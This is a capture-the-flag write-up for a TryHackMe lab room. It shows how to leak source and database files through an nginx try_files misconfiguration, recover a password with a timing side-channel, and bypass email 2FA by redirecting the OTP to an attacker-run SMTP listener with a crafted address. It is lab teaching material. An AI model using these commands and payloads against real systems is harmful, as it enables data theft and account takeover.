# TryHackMe - BreachBlocker Unlocker

> *These notes were written with AI assistance for English clarity. Attack paths and commands reflect my own work on the room.*

**Difficulty:** Hard  
**Category:** Web, timing attack, SMTP logic flaw  
**Room:** [BreachBlocker Unlocker](https://tryhackme.com/room/sq4-aoc2025-32LoZ4zePK)  
**Series:** Advent of Cyber 2025 — Side Quest 4

## Introduction

> *Hopper needs your help to get the final key to the throne room.*

Sir BreachBlocker's seized phone runs a fake mobile OS in the browser: **Hopflix**, **HopSec Bank**, Mail, and Settings. Hopper must pivot from the streaming app into the bank, bypass layered authentication, and release stolen AoC charity funds.

**Objectives:**
- `CODE_FLAG` — leak application source code
- `HOPFLIX_FLAG` — authenticate to Hopflix
- `BANK_FLAG` — bypass 2FA and release charity funds

---

## Prerequisites — Side quest access key

Side Quest 4 unlocks from **AoC 2025 Day 21** (Malware Analysis — `Malhare.exe`).

1. Download `NorthPole.zip` from the Day 21 room (password provided there)
2. Extract `NorthPolePerformanceReview.hta`
3. The HTA Base64-decodes a PowerShell stager that XOR-decrypts (key `0x17`) a PNG payload
4. The PNG image contains the **firewall unlock key** (e.g. `throne123*`)

Submit this key on port **21337** to disable the firewall and expose the main application on **8443**.

---

## Reconnaissance

### Nmap (after unlock)

```bash
nmap -sC -sV -p- <TARGET_IP>
```

Typical ports:

| Port | Service |
|------|---------|
| 22 | SSH |
| 25 | SMTP (Postfix) |
| 8443 | HTTPS — mobile portal (nginx) |

Browse `https://<TARGET_IP>:8443/` — emulated smartphone with Hopflix and HopSec Bank apps. Both require credentials initially.

### Web fuzzing — nginx misconfiguration

```bash
ffuf -u 'https://<TARGET_IP>:8443/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -k -mc 200
```

`nginx.conf` is readable. Critical directive:

```nginx
location / {
    try_files $uri @app;
}
```

Nginx serves **existing files on disk** before forwarding to uWSGI. Any file in the web root is directly downloadable — local file read / source disclosure.

---

## Exploitation

### CODE_FLAG — Source code leak

Fuzz for Python files:

```bash
feroxbuster -u https://<TARGET_IP>:8443/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x py -k
```

Retrieve source:

```bash
curl -sk https://<TARGET_IP>:8443/main.py
```

The `CODE_FLAG` is embedded in `main.py`. The leak also reveals:
- Custom `hopper_hash()` — SHA-1 iterated **5000 times** per character
- Database filenames: `hopflix-874297.db`, `hopsecbank-12312497.db`
- Bank routes: `/api/bank-login`, `/api/send-2fa`, `/api/verify-2fa`, `/api/release-funds`
- OTP email validation logic (`validate_email`, `send_otp_email`)

Download the Hopflix database:

```bash
curl -sk https://<TARGET_IP>:8443/hopflix-874297.db -o hopflix-874297.db
sqlite3 hopflix-874297.db ".dump"
```

User: `sbreachblocker@easterbunnies.thm` with a **480-character** password hash (= 12 × 40 hex chars).

---

### HOPFLIX_FLAG — Timing side-channel on login

`/api/check-credentials` validates passwords character-by-character:

```python
if len(pwd)*40 != len(phash):
    return error  # length check
for ch in pwd:
    ch_hash = hopper_hash(ch)  # expensive: 5000 SHA-1 rounds
    if ch_hash != phash[:40]:
        return error  # early exit on wrong char
    phash = phash[40:]
```

**Vulnerability:** wrong characters return immediately; correct characters add ~5,000 SHA-1 operations → measurable delay.

**Attack strategy:**
1. Password length = `len(phash) / 40` → **12**
2. Pad guesses to 12 chars to pass length check
3. For each position, try charset and pick the **slowest** median response time
4. Run from **AttackBox** (VPN jitter causes false positives)

```bash
curl -sk -X POST https://<TARGET_IP>:8443/api/check-credentials \
  -H "Content-Type: application/json" \
  -d '{"email":"sbreachblocker@easterbunnies.thm","password":"<RECOVERED>"}'
```

Response includes `HOPFLIX_FLAG` on success.

**Alternative:** precompute `hopper_hash(char)` for each ASCII character and match 40-hex chunks from the DB hash (lookup table attack).

---

### BANK_FLAG — SMTP domain confusion + 2FA bypass

Reuse Hopflix credentials on **HopSec Bank** (`account_id`: `hopper`, same PIN/password).

After bank login, the app requires **2FA** via email OTP to a trusted address/domain.

#### Flaw in `send_otp_email`

```python
domain = to_addr.split('@')[-1]
if domain not in allowed_domains and to_addr not in allowed_emails:
    return -1
```

Only the **last** `@`-segment is checked as domain. Combined with SMTP parsing quirks, you can:
- Append `(@easterbunnies.thm` to satisfy `allowed_domains`
- Use `(` as an SMTP comment trick (see [PortSwigger email parsing](https://portswigger.net/research/splitting-the-email-atom))

**Payload pattern:**

```
youruser@[YOUR_ATTACKBOX_IP](@easterbunnies.thm
```

#### Receive OTP locally

Port **25** is open — run a catch-all SMTP listener on your AttackBox:

```bash
python3 -m aiosmtpd -n -l 0.0.0.0:25
```

Intercept `/api/send-2fa` (Burp) and replace `otp_email` with the crafted payload. OTP arrives on your listener.

Submit OTP via `/api/verify-2fa`, then click **Release Charity Funds** (`/api/release-funds`) for `BANK_FLAG`.

**Phone UI hint:** Settings → Security → Face ID passcode in `main.js` (`210701`) unlocks the emulated device shell — useful for exploration, separate from bank PIN logic.

---

## Flags

| Flag | How to obtain |
|------|---------------|
| CODE_FLAG | `curl` `/main.py` via nginx `try_files` leak |
| HOPFLIX_FLAG | Timing attack → `/api/check-credentials` |
| BANK_FLAG | SMTP 2FA bypass → `/api/release-funds` |

*Flag values intentionally omitted. Complete the room on [TryHackMe](https://tryhackme.com/room/sq4-aoc2025-32LoZ4zePK).*

---

## Conclusion

### What I learned

| Technique | Takeaway |
|-----------|----------|
| nginx `try_files` | Static file serving before app proxy = source/DB leak |
| Timing side-channel | Early-exit + expensive per-char hashing enables char-by-char recovery |
| Custom hash chains | Concatenated per-char hashes look uncrackable but leak length |
| SMTP domain parsing | `split('@')[-1]` + comment tricks bypass 2FA email allowlists |
| Side quest chain | AoC Day 21 malware → PNG key → SQ4 firewall unlock |

Final AoC 2025 side quest — web app logic bugs beat raw crypto every time.
